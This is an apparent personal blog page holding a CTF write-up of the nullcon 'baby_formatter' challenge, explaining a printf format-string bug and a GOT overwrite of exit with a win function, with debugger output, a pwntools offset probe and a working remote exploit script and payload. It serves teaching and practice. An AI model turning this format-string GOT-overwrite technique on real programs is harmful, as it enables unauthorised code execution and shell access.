@@ -1,0 +1,328 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <meta charset="utf-8">
+  <meta http-equiv="pragma" content="no-cache">
+  <meta http-equiv="cache-control" content="no-cache">
+  <meta http-equiv="expires" content="0">
+  
+  <title>Format Strings - GOT Overwrite | k0x55aa</title>
+  <meta name="author" content="k0x55aa">
+  
+  <meta name="description" content="I always hated the formatted strings bugs or never understood it concisely, Therefore I’m writing to explain myself when I took out the challenge of nullcon ctf, baby_formatter.
+lets start with analyzing the binary  with our file command as we can see that our binary is 64 bit and dynamically linked
+12└─$ file baby_formatter baby_formatter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f9112e0876c218b75aa58a45c20ed0308f5da722, for GNU/Linux 3.2.0, not stripped
+
+lets checksec the binary and see what are the mitigations implemented into the binary. Great we can see partial RELRO is present which means the GOT is above the program variables and NX enabled which means out own shellcode can’t be injected into the binary.
+1234567└─$ pwn checksec baby_formatter[*] &amp;#x27;/home/kali/baby_formatter&amp;#x27;    Arch:     amd64-64-little    RELRO:    Partial RELRO    Stack:    No canary found    NX:       NX enabled    PIE:      No PIE (0x400000)
+
+Now lets open our file in ghidra to see what our binary for the interesting functions. When we open our on the left, we can see the symbol table where we have two interesting functions. main and win
+
+When we open the main function in the ghidra decompiler, we can see that we have a local variable local_78 which take value from standard input and print out when the printf function is called. Apart from that we can confirm that the author has implement the proper size check which will not cause the buffer to overflow. And also the program will never return since we have a exit(1) function which is FUN_004010e0(1). what can we do now ?
+
+As we can see that it takes input and return the input to the output with printf as we see in ghidra and prints bye! then exit(1)"> 
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+
+  <meta property="og:title" content="Format Strings - GOT Overwrite"/>
+  <meta property="og:site_name" content="k0x55aa"/>
+
+  
+    <meta property="og:image" content=""/>
+  
+
+  
+    <link rel="alternative" href="/atom.xml" title="k0x55aa" type="application/atom+xml">
+  
+  
+    <link href="/favicon.png" rel="icon">
+  
+  
+  <link rel="stylesheet" href="/css/bootstrap.min.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/font-awesome.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/style.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/responsive.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/highlight.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/prism.css" media="screen" type="text/css">
+  <link rel="stylesheet" href="/css/google-fonts.css" media="screen" type="text/css">
+  <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
+
+  <script src="/js/jquery-2.0.3.min.js"></script>
+
+  <!-- analytics -->
+  
+  <!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=UA-70812759-1"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'UA-70812759-1');
+</script>
+
+
+
+
+
+
+<meta name="generator" content="Hexo 7.0.0"></head>
+
+ <body>  
+  <nav id="main-nav" class="navbar navbar-inverse navbar-fixed-top" role="navigation">
+    <div class="container">
+      <button type="button" class="navbar-header navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
+		<span class="sr-only">Toggle navigation</span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+        <span class="icon-bar"></span>
+      </button>
+	  <a class="navbar-brand" href="/">k0x55aa</a>
+      <div class="collapse navbar-collapse nav-menu">
+		<ul class="nav navbar-nav">
+		  
+		  <li>
+			<a href="/archives" title="All the articles.">
+			  <i class=""></i>Archives
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/categories" title="All the categories.">
+			  <i class=""></i>Categories
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/tags" title="All the tags.">
+			  <i class=""></i>Tags
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/about" title="About me.">
+			  <i class=""></i>About
+			</a>
+		  </li>
+		  
+		  <li>
+			<a href="/atom.xml" title="Subscribe me.">
+			  <i class=""></i>RSS
+			</a>
+		  </li>
+		  
+		</ul>
+      </div>
+    </div> <!-- container -->
+</nav>
+<div class="clearfix"></div>
+
+  <div class="container">
+  	<div class="content">
+    	 
+
+
+	
+		<div class="page-header">
+			<h1> Format Strings - GOT Overwrite</h1>
+		</div>
+	
+
+
+
+<div class="row post">
+	<!-- cols -->
+	
+	<div id="top_meta"></div>
+	<div class="col-md-9">
+	
+
+	<!-- content -->
+	<div class="mypage">		
+	  		
+
+	  <p>I always hated the formatted strings bugs or never understood it concisely, Therefore I’m writing to explain myself when I took out the challenge of nullcon ctf, baby_formatter.</p>
+<p>lets start with analyzing the binary  with our file command as we can see that our binary is 64 bit and dynamically linked</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">└─$ file baby_formatter </span><br><span class="line">baby_formatter: ELF 64-bit LSB executable, x86-64, version 1 (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86-64.so.2, BuildID[sha1]=f9112e0876c218b75aa58a45c20ed0308f5da722, <span class="keyword">for</span> GNU/Linux 3.2.0, not stripped</span><br></pre></td></tr></table></figure>
+
+<p>lets checksec the binary and see what are the mitigations implemented into the binary. Great we can see partial RELRO is present which means the GOT is above the program variables and NX enabled which means out own shellcode can’t be injected into the binary.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">└─$ pwn checksec baby_formatter</span><br><span class="line">[*] <span class="string">&#x27;/home/kali/baby_formatter&#x27;</span></span><br><span class="line">    Arch:     amd64-64-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x400000)</span><br></pre></td></tr></table></figure>
+
+<p>Now lets open our file in ghidra to see what our binary for the interesting functions. When we open our on the left, we can see the symbol table where we have two interesting functions. main and win</p>
+<p><img src="/2024/03/16/format-string1/formatstrings1.png" alt="alt text"></p>
+<p>When we open the main function in the ghidra decompiler, we can see that we have a local variable local_78 which take value from standard input and print out when the printf function is called. Apart from that we can confirm that the author has implement the proper size check which will not cause the buffer to overflow. And also the program will never return since we have a exit(1) function which is FUN_004010e0(1). what can we do now ?</p>
+<p><img src="/2024/03/16/format-string1/formatstrings2.png" alt="alt text"></p>
+<p>As we can see that it takes input and return the input to the output with printf as we see in ghidra and prints bye! then exit(1)</p>
+<p><img src="/2024/03/16/format-string1/formatstrings3.png" alt="alt text"></p>
+<p>Now if we give our input as %d we can see that we get unexpected output -129881392</p>
+<p><img src="/2024/03/16/format-string1/formatstrings4.png" alt="alt text"></p>
+<p>now lets display our value in hexadecimal by using %x and now this time we give multiple %x %x %x we see we get hex output now lets go further and add 4 ‘A’ and form a payload like</p>
+<p>AAAA%x.%x.%x.%x.%x.%x.%x.%x.%x.%x we can see that we have 41414141 which is the exact replica of AAAA in hexadecimal. Which means we can read the values somewhere on the stack by insert our own data using  C formatter</p>
+<p><img src="/2024/03/16/format-string1/formatstrings5.png" alt="alt text"></p>
+<p>In printf there is a formatter which helps in executing function $n, now if our function return want to write the return function the value we want may something like &#x2F;bin&#x2F;bash. Now lets go back ghidra and check for the functions where we can execute &#x2F;bin&#x2F;bash. Fortunately we have a function where we can write invoke &#x2F;bin&#x2F;bash, now let grep the function address of win.</p>
+<p><img src="/2024/03/16/format-string1/formatstrings6.png" alt="alt text"></p>
+<p>we can execute objdump to grep the win function address</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">└─$ objdump -t ./baby_formatter| grep win    </span><br><span class="line">00000000004011d6 g     F .text  0000000000000047              win</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Now we need to know where our return function or the last exit function of the program.</p>
+<p>lets open our gdb and try to find our exit function exit(1), we can see that we have a exit@plt. Disassemble the main exit@plt function, we can see that it jumps to exit@got address 0x404040.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; disass main</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> main:</span><br><span class="line">   0x000000000040121d &lt;+0&gt;:     endbr64</span><br><span class="line">   0x0000000000401221 &lt;+4&gt;:     push   rbp</span><br><span class="line">   0x0000000000401222 &lt;+5&gt;:     mov    rbp,rsp</span><br><span class="line">   0x0000000000401225 &lt;+8&gt;:     add    rsp,0xffffffffffffff80</span><br><span class="line">   0x0000000000401229 &lt;+12&gt;:    mov    rax,QWORD PTR fs:0x28</span><br><span class="line">   ....</span><br><span class="line">   0x00000000004012be &lt;+161&gt;:   mov    rdi,rax</span><br><span class="line">   0x00000000004012c1 &lt;+164&gt;:   mov    eax,0x0</span><br><span class="line">   0x00000000004012c6 &lt;+169&gt;:   call   0x4010a0 &lt;<span class="built_in">printf</span>@plt&gt;</span><br><span class="line">   0x00000000004012cb &lt;+174&gt;:   lea    rax,[rip+0xdab]        <span class="comment"># 0x40207d</span></span><br><span class="line">   0x00000000004012d2 &lt;+181&gt;:   mov    rdi,rax</span><br><span class="line">   0x00000000004012d5 &lt;+184&gt;:   call   0x401090 &lt;puts@plt&gt;</span><br><span class="line">   0x00000000004012da &lt;+189&gt;:   mov    edi,0x1</span><br><span class="line">   0x00000000004012df &lt;+194&gt;:   call   0x4010e0 &lt;<span class="built_in">exit</span>@plt&gt;</span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; disass 0x4010e0</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> <span class="built_in">exit</span>@plt:</span><br><span class="line">   0x00000000004010e0 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00000000004010e4 &lt;+4&gt;:     bnd jmp QWORD PTR [rip+0x2f55]        <span class="comment"># 0x404040 &lt;exit@got.plt&gt;</span></span><br><span class="line">   0x00000000004010eb &lt;+11&gt;:    nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; x 0x404040</span><br><span class="line">0x404040 &lt;<span class="built_in">exit</span>@got.plt&gt;:        0x00401080</span><br></pre></td></tr></table></figure>
+
+<p>Now lets set a break point break  *0x4010e0 in exit@plt entry, now run the program input anything, when the break point hits. Lets access memory of our <a href="mailto:&#101;&#120;&#105;&#116;&#64;&#x67;&#111;&#x74;&#46;&#x70;&#108;&#116;">&#101;&#120;&#105;&#116;&#64;&#x67;&#111;&#x74;&#46;&#x70;&#108;&#116;</a>, x 0x404040 and set the memory of the address 0x404040 to our win function address 0x0411d6 then access the memory of address 0x404040 again to check the value is modified by our win address 0x0411d6, continue the function we get win.</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">pwndbg&gt; disass 0x4010e0</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> <span class="keyword">function</span> <span class="built_in">exit</span>@plt:</span><br><span class="line">=&gt; 0x00000000004010e0 &lt;+0&gt;:     endbr64</span><br><span class="line">   0x00000000004010e4 &lt;+4&gt;:     bnd jmp QWORD PTR [rip+0x2f55]        <span class="comment"># 0x404040 &lt;exit@got.plt&gt;</span></span><br><span class="line">   0x00000000004010eb &lt;+11&gt;:    nop    DWORD PTR [rax+rax*1+0x0]</span><br><span class="line">End of assembler dump.</span><br><span class="line">pwndbg&gt; x 0x404040</span><br><span class="line">0x404040 &lt;<span class="built_in">exit</span>@got.plt&gt;:        0x00401080</span><br><span class="line">pwndbg&gt; <span class="built_in">set</span> &#123;int&#125;0x404040=0x4011d6</span><br><span class="line">pwndbg&gt; x 0x404040</span><br><span class="line">0x404040 &lt;<span class="built_in">exit</span>@got.plt&gt;:        0x004011d6</span><br><span class="line">pwndbg&gt; c</span><br><span class="line">Continuing.</span><br><span class="line">huh? how did you find me???</span><br><span class="line">oh well here is your shellprocess 276363 is executing new program: /usr/bin/dash</span><br><span class="line">Warning:</span><br><span class="line">Cannot insert breakpoint 1.</span><br><span class="line">Cannot access memory at address 0x4010e0</span><br></pre></td></tr></table></figure>
+
+<p>Now our goal is clear and concise that somehow we have to overwrite the exit address of the got.exit function to our win function, how can we process with it. umm lets use pwn tools this time and automate manual stuff below script will print index along with reflected ‘A’s or ‘41’s</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">20</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        target = process(<span class="string">&quot;./baby_formatter&quot;</span>)</span><br><span class="line">        payload = <span class="string">f&#x27;b&quot;AAAAAAAA.%<span class="subst">&#123;i&#125;</span>$p&#x27;</span></span><br><span class="line">        target.sendlineafter(<span class="string">b&quot;\n&quot;</span>,payload)</span><br><span class="line">        <span class="built_in">print</span>(target.recvall(),i)</span><br><span class="line">        target.close</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>Now if we convert our win address to decimal which is 4198870 . let us crafted the payload</p>
+<p>payload &#x3D; (b”%4198870x%10$nAA”) + pack(elf.got.exit)<br>%4198870x — padding</p>
+<p>%10$n - overwriting the value at 10 offset since our value main offset is 8 and next 2 offset of 16 bytes is use to overwrite the address</p>
+<p>pack(elf.got.exit) — got.exit address</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line"></span><br><span class="line">elf = context.binary = ELF(<span class="string">&quot;./baby_formatter&quot;</span>)</span><br><span class="line">ip = targetip</span><br><span class="line">port = targetport</span><br><span class="line">io = remote(ip,port)</span><br><span class="line">payload = (<span class="string">b&quot;%4198870x%10$nAA&quot;</span>) + pack(elf.got.exit)</span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.interactive()   </span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>executing we will get the flag</p>
+<p><img src="/2024/03/16/format-string1/formatstrings7.png" alt="alt text"></p>
+
+	  <div class="article-footer-copyright">
+
+    <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh" target="_blank"></a>
+</div>
+
+	</div>
+
+	
+	
+	<div>
+  	<center>
+
+	<div class="pagination">
+
+    
+    
+    <a type="button" class="btn btn-default disabled"><i class="fa fa-arrow-circle-o-left"></i>Prev</a>
+    
+
+    <a href="/" type="button" class="btn btn-default"><i class="fa fa-home"></i>Home</a>
+    
+    <a href="/2024/02/10/antivirus1/" type="button" class="btn btn-default ">Next<i
+                class="fa fa-arrow-circle-o-right"></i></a>
+    
+
+    
+</div>
+
+
+    </center>
+	</div>
+	
+	<!-- comment -->
+	<!--
+<section id="comment">
+    <h2 class="title">Comments</h2>
+
+    
+</section>
+
+-->
+	
+	
+	
+	</div> <!-- col-md-9/col-md-12 -->
+
+
+	
+	<div id="side_meta">
+		<div class="col-md-3" id="post_meta"> 
+
+	<!-- date -->
+	
+	<div class="meta-widget">
+	<i class="fa fa-clock-o"></i>
+	2024-03-16 
+	</div>
+	
+
+	<!-- categories -->
+    
+
+	<!-- tags -->
+	
+	<div class="meta-widget">
+	<a data-toggle="collapse" data-target="#tags"><i class="fa fa-tags"></i></a>		  
+    <ul id="tags" class="tag_box list-unstyled collapse in">	  
+	    
+  <li><a href="/tags/pwn/">pwn<span>1</span></a></li> <li><a href="/tags/ctf/">ctf<span>1</span></a></li> <li><a href="/tags/exploit/">exploit<span>1</span></a></li> <li><a href="/tags/linux/">linux<span>1</span></a></li>
+    </ul>
+	</div>
+		
+
+	<!-- toc -->
+	<div class="meta-widget">
+	
+	</div>
+	
+    <hr>
+	
+</div><!-- col-md-3 -->
+
+		
+
+	</div>
+	
+		
+
+</div><!-- row -->
+
+<!--
+ -->
+
+
+
+	</div>
+  </div>
+  <div class="container-narrow">
+  <footer> <p>
+  
+  &copy; 2024 k0x55aa's Blog
+  
+      powered by <a href="http://hexo.io/" target="_blank">Hexo</a>.Theme <a href="https://github.com/Ares-X/hexo-theme-freemind.bithack" target="_blank">freemind.bithack</a>  
+</p>
+ </footer>
+</div> <!-- container-narrow -->
+  
+
+
+  
+<a id="gotop" href="#">   
+  <span>⬆︎TOP</span>
+</a>
+
+<script src="/js/jquery.imagesloaded.min.js"></script>
+<script src="/js/gallery.js"></script>
+<script src="/js/bootstrap.min.js"></script>
+<script src="/js/main.js"></script>
+<script src="/js/search.js"></script> 
+
+
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.css" media="screen" type="text/css">
+<script src="/fancybox/jquery.fancybox.pack.js"></script>
+<script type="text/javascript">
+(function($){
+  $('.fancybox').fancybox();
+})(jQuery);
+</script>
+
+
+
+   <script type="text/javascript">      
+     var search_path = "search.xml";
+	 if (search_path.length == 0) {
+	 	search_path = "search.xml";
+	 }
+	 var path = "/" + search_path;
+     searchFunc(path, 'local-search-input', 'local-search-result');
+   </script>
+
+<script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"tagMode":false,"debug":false,"model":{"scale":1,"hHeadPos":0.5,"vHeadPos":0.618,"jsonPath":"https://raw.githubusercontent.com/iCharlesZ/vscode-live2d-models/master/model-library/girls-frontline/M4-SOPMOD-II-2/normal/model.json"},"display":{"position":"right","superSample":2,"width":200,"height":450,"hOffset":30,"vOffset":-20},"mobile":{"position":"bottom","width":100,"height":100,"show":true,"scale":0.5,"hOffset":1,"vOffset":-1},"react":{"opacityDefault":1,"opacityOnHover":0.2},"log":false,"pluginJsPath":"lib/","pluginModelPath":"assets/","pluginRootPath":"live2dw/"});</script></body>
+   </html>
